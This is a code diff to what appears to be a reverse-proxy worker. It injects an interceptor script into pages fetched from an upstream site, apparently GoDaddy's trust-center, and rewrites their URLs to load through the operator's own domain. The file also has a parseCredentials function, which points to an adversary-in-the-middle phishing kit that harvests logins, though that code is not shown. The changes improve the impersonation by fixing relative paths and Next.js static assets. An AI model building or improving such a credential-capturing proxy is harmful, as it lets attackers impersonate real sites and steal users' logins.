@@ -199,7 +199,11 @@ function parseCredentials(bodyText) {
 }
 
 // ==================== CLIENT-SIDE INTERCEPTOR SCRIPT ====================
-function generateInterceptorScript(upstreamDomain) {
+function generateInterceptorScript(upstreamDomain, currentPath) {
+  // CRITICAL FIX: Extract the base path from currentPath (e.g., /trust-center/)
+  const pathSegments = currentPath.split('/').filter(Boolean);
+  const basePath = pathSegments.length > 0 ? '/' + pathSegments[0] + '/' : '/';
+
   return `
 <script>
 (function() {
@@ -209,6 +213,7 @@ function generateInterceptorScript(upstreamDomain) {
     const PROXY_PREFIX = '${PROXY_PREFIX}';
     const YOUR_DOMAIN = '${YOUR_DOMAIN}';
     const CURRENT_UPSTREAM = '${upstreamDomain}';
+    const CURRENT_BASE_PATH = '${basePath}';
 
     function shouldProxyDomain(hostname) {
       if (!hostname) return false;
@@ -250,9 +255,17 @@ function generateInterceptorScript(upstreamDomain) {
           return 'https:' + url;
         }
 
-        // Relative URLs starting with /
+        // Relative URLs starting with / (root-relative)
         if (url.startsWith('/')) {
+          // If it's a root-relative URL, it should go to the upstream domain root
           return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + url;
+        }
+
+        // Relative URLs not starting with / (path-relative)
+        // These should be resolved against the current base path
+        if (!url.startsWith('/') && !url.startsWith('data:') && !url.startsWith('blob:')) {
+          // Prepend the base path to make it absolute, then proxy it
+          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + CURRENT_BASE_PATH + url;
         }
 
       } catch(e) {}
@@ -366,7 +379,7 @@ function generateInterceptorScript(upstreamDomain) {
       }
     }, true);
 
-    console.log('[Proxy Interceptor] Active for upstream:', CURRENT_UPSTREAM);
+    console.log('[Proxy Interceptor] Active for upstream:', CURRENT_UPSTREAM, 'Base path:', CURRENT_BASE_PATH);
   } catch(err) {
     console.error('[Proxy Interceptor] Failed to initialize:', err);
   }
@@ -546,16 +559,17 @@ export default async function handleRequest(request) {
 
       // HTML-specific processing
       if (ct.includes('text/html')) {
-        const baseTag = `<base href="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/">`;
-        const interceptor = generateInterceptorScript(upstreamDomain);
+        // CRITICAL FIX: Don't use base tag for root paths, it causes issues with relative URLs
+        // Instead, rely on the interceptor script to rewrite URLs dynamically
+        const interceptor = generateInterceptorScript(upstreamDomain, info.path);
 
-        // Insert base tag and script as early as possible
+        // Insert script as early as possible
         if (text.includes('<head>')) {
-          text = text.replace('<head>', `<head>${baseTag}${interceptor}`);
+          text = text.replace('<head>', `<head>${interceptor}`);
         } else if (text.includes('<html>')) {
-          text = text.replace('<html>', `<html>${baseTag}${interceptor}`);
+          text = text.replace('<html>', `<html>${interceptor}`);
         } else {
-          text = baseTag + interceptor + text;
+          text = interceptor + text;
         }
       }
 
@@ -588,6 +602,30 @@ export default async function handleRequest(request) {
           }
           return `${attr}='${PROXY_PREFIX}${upstreamDomain}/${path}'`;
         });
+
+        // CRITICAL FIX: Handle Next.js _next/static paths specifically
+        // These often appear in Next.js apps like GoDaddy's trust-center
+        text = text.replace(/src="\/_next\/static\/([^"]+)"/g, 
+          `src="${PROXY_PREFIX}${upstreamDomain}/_next/static/$1"`);
+        text = text.replace(/href="\/_next\/static\/([^"]+)"/g, 
+          `href="${PROXY_PREFIX}${upstreamDomain}/_next/static/$1"`);
+        text = text.replace(/src='\/_next\/static\/([^']+)'/g, 
+          `src='${PROXY_PREFIX}${upstreamDomain}/_next/static/$1'`);
+        text = text.replace(/href='\/_next\/static\/([^']+)'/g, 
+          `href='${PROXY_PREFIX}${upstreamDomain}/_next/static/$1'`);
+
+        // CRITICAL FIX: Handle relative URLs that don't start with /
+        // These are path-relative and need the current path context
+        // Match src="path/..." or href="path/..." (not starting with / or http or data:)
+        text = text.replace(/(src|href)="([^"]+)"/g, (match, attr, path) => {
+          // Skip if already handled
+          if (path.startsWith('/') || path.startsWith('http') || path.startsWith('data:') || path.startsWith('blob:') || path.startsWith('#')) {
+            return match;
+          }
+          // Rewrite path-relative URLs
+          const currentDir = '${info.path}'.replace(/\/[^\/]*$/, '/'); // Get directory part of current path
+          return `${attr}="${PROXY_PREFIX}${upstreamDomain}${currentDir}${path}"`;
+        });
       }
 
       // Handle CSS url() references specifically
@@ -618,17 +656,6 @@ export default async function handleRequest(request) {
           } catch(e) {}
           return match;
         });
-
-        // CRITICAL FIX: Handle Next.js _next/static and other special paths
-        // These often appear in Next.js apps like GoDaddy's trust-center
-        text = text.replace(/src="\/_next\/static\/([^"]+)"/g, 
-          `src="${PROXY_PREFIX}${upstreamDomain}/_next/static/$1"`);
-        text = text.replace(/href="\/_next\/static\/([^"]+)"/g, 
-          `href="${PROXY_PREFIX}${upstreamDomain}/_next/static/$1"`);
-        text = text.replace(/src='\/_next\/static\/([^']+)'/g, 
-          `src='${PROXY_PREFIX}${upstreamDomain}/_next/static/$1'`);
-        text = text.replace(/href='\/_next\/static\/([^']+)'/g, 
-          `href='${PROXY_PREFIX}${upstreamDomain}/_next/static/$1'`);
       }
 
       return new Response(text, { status: resp.status, headers: newHeaders });
